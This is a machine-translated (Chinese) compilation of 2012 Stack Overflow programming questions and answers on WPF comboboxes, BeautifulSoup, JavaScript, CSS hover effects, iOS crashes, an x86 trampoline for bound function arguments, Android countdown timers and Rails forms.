[在 LINQ to SQL 中设计数据访问层](http://www.simple-talk.com/dotnet/.net-framework/designing-a-data-access-layer-in-linq-to-sql/)

[LINQ to SQL 生成的对象可以解耦吗？](https://stackoverflow.com/questions/222895/can-linq-to-sql-generated-objects-be-decoupled)

[单击按钮时调用的方法代码放在哪里？](http://forums.asp.net/t/1817339.aspx/1?Where%20to%20put%20method%20code%20which%20is%20called%20on%20click%20of%20a%20button%20)

[LINQ to SQL 和存储库模式](https://stackoverflow.com/questions/460882/linq-to-sql-and-the-repository-pattern)

[使用 C# 将业务逻辑层与用户界面层解耦](http://aspalliance.com/1360_Decoupling_Business_Logic_Layer_from_the_User_Interface_Layer_using_C.all)

# c# - 如何在wpf中动态更改组合框特定项目的颜色

> ID：11271821
> 
> 赞同：7
> 
> 时间：2012-06-30T05:50:46.903
> 
> 标签：c#, wpf, combobox

```
<Grid x:Name="LayoutRoot">
    <ComboBox x:Name="com_ColorItems" Height="41" Margin="198,114,264,0" VerticalAlignment="Top" FontSize="13.333" FontWeight="Bold" Foreground="#FF3F7E24"/>
</Grid> 
```

使用上面的代码，我将组合框中的所有项目都涂成绿色。

```
private void Window_Loaded(object sender, RoutedEventArgs e)
{
        for (int i = 0; i < 5; i++)
        {
            com_ColorItems.Items.Add(i);
        }
} 
```

使用上面的代码，我已将五个项目填充到组合框中。现在我喜欢在后面的代码中动态地将第 3 项 (3) 的颜色更改为“红色”。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-30T05:58:43.523

而不是在组合框中添加实际值，而是`i`添加一个`ComboBoxItem`：

```
private void Window_Loaded(object sender, RoutedEventArgs e)
    {
        for (int i = 0; i < 5; i++)
        {
            ComboBoxItem item = new ComboBoxItem();

            if (i == 2) item.Foreground = Brushes.Blue;
            else item.Foreground = Brushes.Pink;

            item.Content = i.ToString();
            com_ColorItems.Items.Add(item);
        }
    } 
```

如果您想稍后修改使用此方法创建的 ComboBoxItem，您可以这样做：

```
var item = com_ColorItems.Items[2] as ComboBoxItem; // Convert from Object
if (item != null)                                   // Conversion succeeded 
{
    item.Foreground = Brushes.Tomato;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T06:02:22.693

首先，尝试绑定你的Source，避免通过后面的代码直接访问。而且您可以在 ItemSource 绑定中使用转换器。

例如

```
ItemSource={Binding MyComboboxItems, Converter={StaticResource MyConverter}} 
```

并在您的转换器中找到您的第 3 个项目并给它们一个不同的 ForegroundColor

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-03-20T20:00:53.093

除了 Mario Binder 的回答，这里有一个这样的转换器的例子：

```
public class ListToColoredComboboxItemsConverter : IValueConverter
{
    public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
    {
        if (value is IEnumerable<Measurement> measurements)
        {
            var comboBoxItems = new List<ComboBoxItem>(measurements.Count());
            foreach (var measurement in measurements)
            {
                var item = new ComboBoxItem();
                item.Content = measurement;
                if (!string.IsNullOrWhiteSpace(measurement.ErrorMessage))
                    item.Foreground = Brushes.Red;
                comboBoxItems.Add(item);
            }
            return comboBoxItems;
        }
        return null;
    }

    public object ConvertBack(object value, Type targetTypes, object parameter, CultureInfo culture)
    {
        throw new NotImplementedException();
    }
} 
```

并且可能您还想将选定的项目转换回一个值：

```
public class ComboBoxItemToItemConverter : IValueConverter
{
    public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
    {
        return value;
    }

    public object ConvertBack(object value, Type targetTypes, object parameter, CultureInfo culture)
    {
        if (value is ComboBoxItem comboBoxItem)
        {
            return comboBoxItem.Content;
        }
        return null;
    }
} 
```

# android - Android 应用程序的语法荧光笔

> ID：11271830
> 
> 赞同：1
> 
> 时间：2012-06-30T05:52:35.883
> 
> 标签：android, syntax-highlighting

我想编写一个需要语法突出显示的android本机应用程序。是否有人知道 java/android 中是否有任何可用的语法高亮库，以及它是否支持某种程度的自定义，例如自定义颜色编码。

# python - 使用 beautifulsoup 在定义的范围内查找标签

> ID：11271832
> 
> 赞同：1
> 
> 时间：2012-06-30T05:52:40.290
> 
> 标签：python, beautifulsoup

我使用 beautifulsoup 来提取数据。

我有这样一个 html 文件：

```
<div class=a>
<a href='google.com'>a</a>
</div>
<div class=b>
<a href='google.com'>c</a>
<a href='google.com'>d</a>
</div> 
```

我想提取数据'c，d'，我不需要数据'a'

所以我这样做：

```
google_list = soup.findAll('a',href='google.com')
for item in google_list:
    print item.strings 
```

它将打印 a、c、d。所以我的问题是如何在没有 'a' 的情况下打印 'c','d' in

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T06:06:41.977

您可以根据`div`谁的类进行选择`b`，然后在*该标签*上使用您的原始查询，以便查找它的子项：

```
div = soup.find_all('div', {"class":"b"})[0]
items = div.find_all('a', href="google.com") 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T07:02:03.707

几年前我停止使用 Beautiful soup 并更喜欢 lxml 库，它的 html 解析器很灵活，还允许 xpath 查询。

```
html = """<div class=a>
<a href='google.com'>a</a>
</div>
<div class=b>
<a href='google.com'>c</a>
<a href='google.com'>d</a>
</div>
"""
root = lxml.html.fromstring(html).getroottree()
root.xpath("//div[@class='b']/a[@href='google.com']/text()")
# ['c', 'd'] 
```

这会从所有引用“google.com”的锚点中找到所有文本，这些锚点位于任何具有“b”类的 div 内。

# javascript - 在 js 文件中声明 javascript 对象。

> ID：11271835
> 
> 赞同：1
> 
> 时间：2012-06-30T05:53:25.077
> 
> 标签：javascript, html

我想在 js 文件中声明一个对象，例如： var o = {p:1};

然后在我的 html 文件中为它创建一个手表。

```
 <script>

  var o = {p:1}; 

  o.watch("p",function (id, oldval, newval)
  { 

  alert(newval);
  return newval; 
  }); 

  o.p=count;
  </script> 
```

此代码在我的 html 中有效，但如果我在我的 js 文件中声明“var o”，它就不起作用。我想这样做的原因是因为我想修改我的 js 文件中对象的值并在其中检测到它的HTML。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:57:00.797

我能想到的跟踪对象变量更改的唯一方法是使用 setter func 而不是直接更新值：

```
<script type="text/javascript">
  var o = { 
    p:1,
    q:0,
    watches: [],
    setProp: function(prop, newVal) {
      var oldVal = this[prop];
      this[prop] = newVal;
      if(typeof(this.watches[prop]) == 'function')
      {
         this.watches[prop](prop, oldVal, this['prop']);
      }
    }
  }; 

  o.watches["p"] = function (id, oldval, newval) {
    alert(newval);
    return newval; 
  }; 

  o.setProp('p', count);
  o.setProp('q', 0 - count);
</script> 
```

这是我能想到的最简单的事情，尽管您可能想要添加一些更好的错误检查或 addWatch(prop, func) 方法到 o.

# css - 将鼠标悬停在上面并有一个 展示？

> ID：11271842
> 
> 赞同：0
> 
> 时间：2012-06-30T05:54:59.720
> 
> 标签：css

这是我目前正在做的事情。

PHP 回显了数据库中最近发布的用户名：

```
echo '<div id="userblock">test</div>';
echo '<span class="userpost">' . $str . ' - posted by <b>' . $username . '</b></span><br /><br />'; 
```

然后我想要它，所以当测试悬停在您看到用户个人资料/统计/信息直接出现在帖子的左侧时。

到目前为止，这是我对 CSS 的了解，我绝不擅长造型或造型。所以我会喜欢你的意见。

```
div#userblock {
display:none;
}

span.userpost:hover  div#userblock {
    background-color:#efefef;
    height:150px;
    width:150px;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:06:55.540

因为那`#userblock`必须嵌套在`.userpost`.

就像是..

```
echo '<span class="userpost"> <div id="userblock".. />  </span>'; 
```

然后使用以下 CSS：

```
#userblock {

    display:none;
}

.userpost:hover  #userblock {

    display:block;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T07:14:12.410

以下是使用 jquery 执行此操作的方法：http: [//jsfiddle.net/surendraVsingh/sT66P/1/](http://jsfiddle.net/surendraVsingh/sT66P/1/)

**jQuery代码：**

```
$('.userpost').hover(function(){
    $(this).prev("#userblock").show();
    //$(this).prev("#userblock").toggle(); //if you want to toggle show/hide of div//
});​ 
```

**CSS 代码**

```
#userblock {
 background:#999;
 display:none;
}

.userpost{
    background-color:#efefef;
    height:150px;
    width:150px;
}​ 
```

# javascript - Javascript从05截断0

> ID：11271843
> 
> 赞同：0
> 
> 时间：2012-06-30T05:55:15.433
> 
> 标签：javascript, html

我在javascript中遇到问题。我有两个选择框，一个用于小时，一个用于分钟。当用户选择时间时，应自动设置 AM/PM。

谁能帮我？？？我试过这段代码：

**代码：**

```
<select class="cust_ddd3" id="phr" onchange="hors(this.value)">
    <option value="1">1</option>
    <option value="2">2</option>
    <option value="3">3</option>
    <option value="4">4</option>
    <option value="5">5</option>
    <option value="6">6</option>
    <option value="7">7</option>
    <option value="8">8</option>
    <option value="9">9</option>
    <option value="10">10</option>
    <option value="11">11</option>
    <option value="12">12</option>
</select>

<select class="cust_ddd2" id="pmns" onchange="mns(this.value);">
    <option value="00">00</option>
    <option value="05">05</option>
    <option value="10">10</option>
    <option value="15">15</option>
    <option value="20">20</option>
    <option value="25">25</option>
    <option value="30">30</option>
    <option value="35">35</option>
    <option value="40">40</option>
    <option value="45">45</option>
    <option value="50">50</option>
    <option value="55">55</option>
</select>

Pickup Time: <span id="hrs">08</span>:<span id="mns">00</span><span id="ap">AM</span> 
```

**Javascript**

```
<script type="text/javascript">
function hors(str)
{
  document.getElementById('hrs').innerHTML=+str;
}

function mns(str)
{
  alert(str);
  if(document.getElementById('phr').value<=11)
  {
    var pm="AM";
    document.getElementById('ap').innerHTML=pm;
  }
  else
  {
    var am="PM";
    document.getElementById('ap').innerHTML=am;
  }
  document.getElementById('mns').innerHTML=+str;
}
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T06:00:36.497

当您将分钟转换为数字时

```
document.getElementById('mns').innerHTML=+str; 
```

第一个零被丢弃（正常数字没有前导零）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T06:02:45.977

错误在这里 document.getElementById('mns').innerHTML=+str;。您正在使用 +=，而您应该使用 += 或 =：

```
document.getElementById('mns').innerHTML = str; 
```

=+ 将字符串转换为数字（因此忽略左侧的零），然后将结果添加到原始值

# iphone - 在 MKMapVIew 中像 MKPinAnnotation 一样绘制 Pin 查看 Pin

> ID：11271844
> 
> 赞同：0
> 
> 时间：2012-06-30T05:55:51.190
> 
> 标签：iphone, mkmapview, mkpinannotationview

我想像 MKPinAnnotationView Pin 一样以编程方式绘制 Pin，而不是使用 Pin 图像。如果有人有想法，请帮助我。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:18:54.930

试试这个

> -(MKAnnotationView *)mapView:(MKMapView *)mV viewForAnnotation: (id)annotation

```
if(annotation != mapView.userLocation) 
    {
        static NSString *defaultPinID = @"PinId1";
        pinView = (MKPinAnnotationView *)[mapView dequeueReusableAnnotationViewWithIdentifier:defaultPinID];
        if ( pinView == nil ) pinView = [[[MKPinAnnotationView alloc]
                                   initWithAnnotation:annotation reuseIdentifier:@"pin1"] autorelease];

        //pinView= [[MKAnnotationView alloc] initWithAnnotation:annotation reuseIdentifier:@"pin1"];

        //pinView.pinColor = MKPinAnnotationColorRed; 
        pinView.canShowCallout = YES;
        pinView.animatesDrop = YES;

        [pinView setImage:[UIImage imageNamed:@"user.png"]];

    } 
```

# assembly - 在编译器中实现绑定函数参数

> ID：11271848
> 
> 赞同：1
> 
> 时间：2012-06-30T05:56:39.427
> 
> 标签：assembly, compiler-construction, programming-languages, compilation, functional-programming

我有一个函数式编程语言设计的想法，它大量使用绑定函数参数。我试图将 x86 程序集中的绑定函数参数表示为编译器实现的一部分。

```
var add  = function(x,y) { return x + y; };
var add2 = add.bind({}, 2);
console.log( add2(3) );      // prints 5 
```

出于互操作性的原因，我想生成裸函数指针，所以我的第一个概念想法是在堆上分配一些可执行内存，并复制到一个存根中，该存根 (a) 推送一个额外的参数并 (b) 调用目标函数。这将是标准库的一部分，并将返回一个本机函数指针，我可以从 x86 汇编程序的其余部分使用它。

我想我遇到了这种方法的一个问题——如果存根用于`call`获取目标函数，那么堆栈包含一个返回地址，该地址最终被解释为函数参数！如果存根用于`jmp`到达目标函数，那么调用者和被调用者都不知道在函数返回时如何清理堆栈。

如何解决？我想可以永久保留一个寄存器作为这种行为的标志，但这并不优雅。

bind() 如何在函数式语言的本机编译器中实现？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T07:25:10.850

进一步考虑，我认为这可以通过使用被调用者清理约定并手动管理我的所有返回地址来完成。它类似于 stdcall，但不完全相同，因为不能使用 call/ret（？）。

伪代码：

```
main:
   ; create stub, copy in 0x02 and &add, the resulting function pointer goes in add2
   local add2 = _create_trampoline

   ; make the call
   push [return address]
   push 0x03 ;arg1
   jmp  add2

; the resulting stub, held on the heap somewhere
add2:
   push 0x02 ;bound argument
   jmp  add

; var add(x,y)
add:
   local x = pop
   local y = pop

   eax = x + y;       

   jmp pop 
```

这样，`add`知道堆栈的布局`y x [ptr]`和执行正确返回。

失去 call/ret 似乎有点激烈，而且函数的堆栈框架`add`非常脆弱，所以我将把这个问题至少再开放 24 小时，希望有更好的解决方案。

* * *

**编辑：**进一步考虑，您可以保留 cdecl、caller-cleanup、call/ret 和所有内容，只需在绑定的蹦床中携带返回地址（这只需要破坏一个寄存器，或将其移动到堆栈并返回）。

伪代码：

```
main:
   ; create stub, copy in 0x02 and &add, the resulting function pointer goes in add2
   local add2 = _magic(0x02, &add);

   ; make the call
   push 0x03;
   call add2;

add2:
   ebx = pop;     ;the return address goes in a temporary
   push 0x02;
   push ebx;
   jmp add

; var add(x,y)
add:
   push ebp;
   mov ebp, esp;

   ; local variables are [ebp+8] and [ebp+12]
   perform calculation into eax

   leave
   ret 
```

在那里，结果是一种非常简洁的技术，可以将绑定函数参数实现为堆上的可执行对象，同时保持 cdecl 调用约定。毫无疑问，这种方法在实施时会出现问题，但我希望它是可行的，而且效率不会太低。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T06:00:40.823

您不能将预先传递的参数存储在内存中。然后，当您看到“add2”时，您从内存中收集参数，将它们推入堆栈，将其他参数推入堆栈（根据需要），然后像正常一样进行函数调用？

我主要是在大声思考我不知道这是答案，但它看起来对我有用。

# iphone - 从 Viewcontroller 切换到另一个视图控制器时发出信号 Sigabart 问题..使用此代码

> ID：11271849
> 
> 赞同：0
> 
> 时间：2012-06-30T05:57:19.250
> 
> 标签：iphone, ios, xcode, ios5, xcode4

我创建了一个应用程序，它从主视图控制器加载另一个视图控制器。从视图控制器 1 到视图控制器 2 的示例......在视图控制器 1 中，如果按下按钮，它需要加载视图控制器 2。在视图控制器 2 中我也有 icarousel 视图。这是我的代码

```
 -(IBAction)showcoll:(id)sender{

CollectionsViewController *sec=[[CollectionsViewController alloc]initWithNibName:Nil bundle:Nil];
sec.modalTransitionStyle=UIModalTransitionStyleCrossDissolve;

NSLog(@"hi");
[self presentModalViewController:sec animated:YES];
}

 - (void)viewDidLoad
 {
[super viewDidLoad];
// Do any additional setup after loading the view, typically from a nib.
CGRect splashFrame =splash.frame;
splashFrame.origin.x = self.view.bounds.size.width;    

[UIView animateWithDuration:3
                      delay:1.0
                    options: UIViewAnimationCurveEaseOut
                 animations:^{
                     splash.frame = splashFrame;

                 } 
                 completion:^(BOOL finished){
                     NSLog(@"Done!");
                 }];
[self.view addSubview: splash];

 } 
```

我遇到的问题是

```
 2012-06-30 11:16:29.301 Minora[948:12203] Done!
 2012-06-30 11:16:31.195 Minora[948:12203] hi
 2012-06-30 11:16:31.198 Minora[948:12203] *** Terminating app due to uncaught exception      'NSUnknownKeyException', reason: '[<UIView 0x6e82b70> setValue:forUndefinedKey:]: this class is not key value coding-compliant for the key dataSource.'
 *** Call stack at first throw:
 (
0   CoreFoundation                      0x013e45a9 __exceptionPreprocess + 185
1   libobjc.A.dylib                     0x02b97313 objc_exception_throw + 44
2   CoreFoundation                      0x013e44e1 -[NSException raise] + 17
3   Foundation                          0x00b3b677 _NSSetUsingKeyValueSetter + 135
4   Foundation                          0x00b3b5e5 -[NSObject(NSKeyValueCoding) setValue:forKey:] + 285
5   UIKit                               0x003eeff6 -[UIView(CALayerDelegate) setValue:forKey:] + 173
6   UIKit                               0x005b730c -[UIRuntimeOutletConnection connect] + 112
7   CoreFoundation                      0x0135a8cf -[NSArray makeObjectsPerformSelector:] + 239
8   UIKit                               0x005b5d23 -[UINib instantiateWithOwner:options:] + 1041
9   UIKit                               0x005b7ab7 -[NSBundle(UINSBundleAdditions) loadNibNamed:owner:options:] + 168
10  UIKit                               0x0046d628 -[UIViewController _loadViewFromNibNamed:bundle:] + 70
11  UIKit                               0x0046b134 -[UIViewController loadView] + 120
12  UIKit                               0x0046b00e -[UIViewController view] + 56
13  UIKit                               0x0046ca3d -[UIViewController viewControllerForRotation] + 63
14  UIKit                               0x00468988 -[UIViewController _visibleView] + 90
15  UIKit                               0x0070a93c -[UIClientRotationContext initWithClient:toOrientation:duration:andWindow:] + 354
16  UIKit                               0x003e281e -[UIWindow _setRotatableClient:toOrientation:updateStatusBar:duration:force:] + 954
17  UIKit                               0x0066a619 -[UIWindowController transition:fromViewController:toViewController:target:didEndSelector:] + 1381
18  UIKit                               0x0046f65d -[UIViewController presentModalViewController:withTransition:] + 3478
19  Minora                              0x0000317a -[ViewController showcoll:] + 218
20  UIKit                               0x003bb4fd -[UIApplication sendAction:to:from:forEvent:] + 119
21  UIKit                               0x0044b799 -[UIControl sendAction:to:forEvent:] + 67
22  UIKit                               0x0044dc2b -[UIControl(Internal) _sendActionsForEvents:withEvent:] + 527
23  UIKit                               0x0044c7d8 -[UIControl touchesEnded:withEvent:] + 458
24  UIKit                               0x003dfded -[UIWindow _sendTouchesForEvent:] + 567
25  UIKit                               0x003c0c37 -[UIApplication sendEvent:] + 447
26  UIKit                               0x003c5f2e _UIApplicationHandleEvent + 7576
27  GraphicsServices                    0x01539992 PurpleEventCallback + 1550
28  CoreFoundation                      0x013c5944 __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION__ + 52
29  CoreFoundation                      0x01325cf7 __CFRunLoopDoSource1 + 215
30  CoreFoundation                      0x01322f83 __CFRunLoopRun + 979
31  CoreFoundation                      0x01322840 CFRunLoopRunSpecific + 208
32  CoreFoundation                      0x01322761 CFRunLoopRunInMode + 97
33  GraphicsServices                    0x015381c4 GSEventRunModal + 217
34  GraphicsServices                    0x01538289 GSEventRun + 115
35  UIKit                               0x003c9c93 UIApplicationMain + 1160
36  Minora                              0x00002ada main + 170
37  Minora                              0x00002a25 start + 53
 )
 terminate called throwing an exception(lldb) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:06:01.170

当您呈现 modalViewController 时，这个 Sigabart 并没有发生，而是看起来您正在将 a 设置`UIView`为 a我猜`dataSource`您`CollectionsViewController`在 viewDidLoad 中做错了什么，因为您实际上还没有看到该视图。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T06:12:49.590

两个问题：

1.  您在创建时没有指定 nib 名称`CollectionsViewController`。您的意思是使用`nil`笔尖名称吗？

2.  如果您不使用笔尖，我不确定您的`splash`视图是在哪里创建的，但我很好奇您的帧动画，然后动画该帧的变化，但在您启动*后*`splash`添加为子视图动画。它是否已经在视图中（如果是，为什么要再次添加它）？如果不是，（a）你在哪里创建它，（b）你为什么不在动画之前添加一个子视图？

# iphone - 如何添加两个文本字段计时并在第三个文本字段中显示

> ID：11271851
> 
> 赞同：0
> 
> 时间：2012-06-30T05:57:39.257
> 
> 标签：iphone

我是 iPhone 应用程序开发的新手，请帮助我。在我的表格视图中，我在每个单元格的右侧添加了自定义按钮，并命名为 ShowStartDate、ShowEndDate、Worked。当我单击 ShowStartDate 自定义按钮时，我导航到另一个视图控制器，在那里我选择了日期和时间（DatePicker），并且我在 ShowStartDate CustomButton 上显示了这个日期。同样，当我单击 SelectDuration Custom Button 时，我导航到另一个视图控制器，在那里我选择了时间，我在 SelectDuration CustomButton 上显示了这个时间。当这两项工作完成后，我必须通过添加在 ShowEndDate 自定义按钮上自动显示时间，ShowStartDate 的日期和时间是 2012 年 6 月 30 日星期六上午 10:09。SelectDuration 的时间是 11:00 小时我如何自动显示 ShowEndDate 的时间，例如 Sat 30 jun 2012 09::09 PM。

请帮助我必须使用哪种类型的 NSTimer 类。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T06:07:47.703

你需要使用 -`- (id)dateByAddingTimeInterval:(NSTimeInterval)seconds`方法。

```
NSDate *mydate = ;// Which you already have
int hours = ;//You already have this

NSTimeInterval hoursInSeconds = hours * 60 * 60;
NSDate *dateAfterAddingHours = [mydate dateByAddingTimeInterval:hoursInSeconds];

// Now you can display dateAfterAddingHours in your third text field 
```

# php - 如何使我的插件的第二个文件成为 WordPress 循环的一部分

> ID：11271855
> 
> 赞同：0
> 
> 时间：2012-06-30T05:59:14.900
> 
> 标签：php, wordpress

我正在创建一个插件，它只有一个`add_option('myinfo')`在我的主插件 php 文件中设置的设置。但是，我有第二个几乎是独立的 php 文件，只是我希望它获得该设置。我尝试使用`get_option('myinfo')`，它在第一个文件中有效，但在第二个文件中，它给出了这个错误：

`Fatal error: Call to undefined function get_option()`

基本上，我认为我的第二个 php 文件完全在 WordPress 之外。没有 WordPress 特定的代码可以工作，它就像一些常规的 php 文件。如何获取 php 文件以访问 WordPress 数据库？

该文件大部分是独立的，它所做的只是响应 Ajax 请求，但我只希望它从我的插件中获得这一数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T07:02:01.657

我还没有尝试过，但是[这个页面](http://blog.makingsense.com/2011/03/create-stand-alone-web-pages-or-widgets-that-use-wordpress-functions/)提供了一些关于如何在独立页面中包含 WordPress 功能的详细信息。

[这个答案](https://stackoverflow.com/questions/5306612/using-wpdb-in-standalone-script/)涵盖了一些相同的想法。

# android - 如何在android中暂停和启动计时器？

> ID：11271858
> 
> 赞同：0
> 
> 时间：2012-06-30T05:59:50.907
> 
> 标签：android, countdowntimer

我正在开发安卓应用程序。在我的项目中，我有 3 页。

*   第一页由 1 个按钮组成。
*   第二页由定时器代码组成。
*   第三页再次包含一个按钮。

现在我的要求是当我点击第一页按钮时，第三页应该打开，第二页中的计时器应该暂停。同样，当我单击第三页按钮时，第二页**计时器应该重新开始它停止的时间**并打开第一页。

我正在努力完成这项任务。指导我完成它，建议应该做些什么来做到这一点。

```
Page1.java

rowTextView.setOnClickListener(new OnClickListener() {
  public void onClick(View v) {

    Intent myIntent = new Intent(v.getContext(),Page3.class);
    startActivity(myIntent);
    finish();                                       
  }
});

Page2.java

public class TimeractivitybestActivity extends Activity {
    EditText e1;
    MyCount counter;
    Long s1;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        e1 = (EditText) findViewById(R.id.editText1);
        counter = new MyCount(15000, 1000);
        counter.start();
     }

    public void method(View v) {

        switch (v.getId()) {

        case R.id.button1:
            counter.cancel();
            break;
        case R.id.button2:
            counter = new MyCount(s1, 1000);
            counter.start();
        }
    }

    public class MyCount extends CountDownTimer {
        public MyCount(long millisInFuture, long countDownInterval) {
            super(millisInFuture, countDownInterval);
        }
        @Override
        public void onFinish() {
            e1.setText("DONE");
        }
        @Override
        public void onTick(long millisUntilFinished) {
            s1 = millisUntilFinished;
            e1.setText("left:" + millisUntilFinished / 1000);
        }
    }
}

Page3.java

public void gobacktopage1(View v)
    {
        Intent myIntent = new Intent(v.getContext(),Page1.class);
        startActivity(myIntent);
        finish();
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:24:16.857

您始终可以存储*s1 的 timeLeft*并像这样再次使用它，*也请阅读评论*

1）在调用定时器时，检查你是否有任何存储的时间

```
 Page1.java       
    rowTextView.setOnClickListener(new OnClickListener() { 
      public void onClick(View v) { 
        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
        long time = sp.getLong("time", 0); // get saved time of times
        Intent myIntent = new Intent(v.getContext(),Page3.class); 
        myIntent.putExtra("time", time); // send it to page2
        startActivity(myIntent); 
        finish();                                        
      } 
    }); 
```

2）如果时间不为0，则使用时间开始时间。

```
 Page2.java 

    public class TimeractivitybestActivity extends Activity {
        EditText e1;
        MyCount counter;
        Long s1;

        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.main);
            long time = this.getIntent().getLongExtra("time", 0); // get
                                                                    // saved
                                                                    // time
            time = (time != 0) ? time : 1500;
            e1 = (EditText) findViewById(R.id.editText1);
            counter = new MyCount(time, 1000); // start with saved time
            counter.start();
        }

        public void method(View v) {

            switch (v.getId()) {

            case R.id.button1:
                counter.cancel();
                break;
            case R.id.button2:
                counter = new MyCount(s1, 1000);
                counter.start();
            }
        }

        public class MyCount extends CountDownTimer {
            public MyCount(long millisInFuture, long countDownInterval) {
                super(millisInFuture, countDownInterval);
            }

            @Override
            public void onFinish() {
                e1.setText("DONE");
            }

            @Override
            public void onTick(long millisUntilFinished) {
                s1 = millisUntilFinished;
                e1.setText("left:" + millisUntilFinished / 1000);
            }
        }

        public void onPause() {
            SharedPreferences sp = PreferenceManager
                    .getDefaultSharedPreferences(this);
            Editor et = sp.edit();
            et.putLong("time", s1); // save time SharedPreference in onPause
            et.commit();
        }

    } 
```

3) 我想第 3 页没有变化。

```
 Page3.java 

    public void gobacktopage1(View v) 
        { 
            Intent myIntent = new Intent(v.getContext(),Page1.class); 
            startActivity(myIntent); 
            finish(); 
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T06:08:55.590

这就是它的工作原理......

```
MyCount counter;
Long s1;

     counter= new MyCount(300000,1000);
    counter.start();

public void asdf(View v){  <---- method for onclick of buttons pause and resuming timer

    switch(v.getId()){

    case R.id.button1:<-- for pause

        counter.cancel();
        break;
    case R.id.button2:<--- for resume
        counter= new MyCount(s1,1000);
         counter.start();
    }
}
public class MyCount extends CountDownTimer{
    public MyCount(long millisInFuture, long countDownInterval) {
    super(millisInFuture, countDownInterval);
    }
    @Override
    public void onFinish() {
    mediaplayer.stop();
   mediaplayer.release();
    }
    @Override
    public void onTick(long millisUntilFinished) {
        s1=millisUntilFinished;

    }
    } 
```

case R.id.button1:<-- 暂停

```
 counter.cancel(); 
```

这是用于暂停计时器并重新开始的那个......

在你的情况下

public void gobacktopage1(View v) { Intent myIntent = new Intent(v.getContext(),Page1.class); 开始活动（我的意图）；结束（）; }

在那个 add counter.cancel() 中写一个方法；在那个方法中并调用那个方法......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T06:13:55.770

```
public class TimerActivity extends Activity{

EditText e1;
MyCount counter;
Long s1;
/** Called when the activity is first created. */ 
@Override
public void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    e1=(EditText)findViewById(R.id.editText1);
    counter= new MyCount(5000,1000);
    counter.start();
}
public void asdf(View v)
{
    switch(v.getId())
    {
        case R.id.button1:         counter.cancel();
        break;
        case R.id.button2:         counter= new MyCount(s1,1000);
        counter.start();
    }
}
public class MyCount extends CountDownTimer
{
    public MyCount(long millisInFuture, long countDownInterval)
    {
        super(millisInFuture, countDownInterval);
    }
    @Override     public void onFinish()
    {
        e1.setText("DONE");
    }
    @Override     public void onTick(long millisUntilFinished)
    {
        s1=millisUntilFinished;
        e1.setText("left:"+millisUntilFinished/1000);
    }
} 
```

}

# ruby-on-rails - Rails：提交后表单输入未保存

> ID：11271864
> 
> 赞同：0
> 
> 时间：2012-06-30T06:00:54.773
> 
> 标签：ruby-on-rails, forms, polymorphic-associations, actionview, actioncontroller

为什么输入此表格的任何内容都无法保存？

新的.html.erb

```
<%= form_for [@requestable, @request] do |f| %>
   <%= f.label :status %>
   <%= f.text_field :status, rows: 8 %>
   <%= f.submit "Request", :class => 'btn'%>
<% end %> 
```

requests_controller.rb

```
class RequestsController < ApplicationController
   before_filter :load_requestable

   def index
     @requests = @requestable.requests
   end

   def new
     @request = @requestable.requests.new
   end

   def create
     @request = @requestable.requests.new(params[:status])
     if @request.save
        redirect_to [@requestable, :requests], notice: "Request sent."
     else
      render :new
   end
 end

private

  def load_requestable
    klass = [Company, Profile].detect { |c| params["#{c.name.underscore}_id"]}
    @requestable = klass.find(params["#{klass.name.underscore}_id"])
  end

end 
```

我的控制器基于此
[https://github.com/railscasts/154-polymorphic-association-revised/blob/master/blog-after/app/controllers/comments_controller.rb](https://github.com/railscasts/154-polymorphic-association-revised/blob/master/blog-after/app/controllers/comments_controller.rb)

request.rb
类请求 < ActiveRecord::Base

```
 attr_accessible :status

  belongs_to :requestable , polymorphic: true
  belongs_to :profile

  validates :status,  presence: true

end 
```

这是由我的调试器生成的

```
--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess
utf8: ✓
authenticity_token: /0H2k89HN4JVXBPsoFWen5rUfx2xr4p5hr1uDSQVlcA=
request: !ruby/hash:ActiveSupport::HashWithIndifferentAccess
  status: pending
commit: Request
action: create
controller: requests
company_id: '1' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:12:07.533

看看你的 params 哈希中有什么。状态字段可能类似于`params[:request][:status]`. 假设标准的 activerecord-y 内容，您希望将整个请求对象的哈希传递给 .new。

# c# - 如何使用 Document.GetElementById("NAME").Click？

> ID：11271875
> 
> 赞同：2
> 
> 时间：2012-06-30T06:03:27.510
> 
> 标签：c#, click, getelementbyid

> **可能重复：**
> [如何在 C# 中单击 webbrowser 控件中的按钮？](https://stackoverflow.com/questions/11271737/how-do-you-click-a-button-in-a-webbrowser-control-in-c)

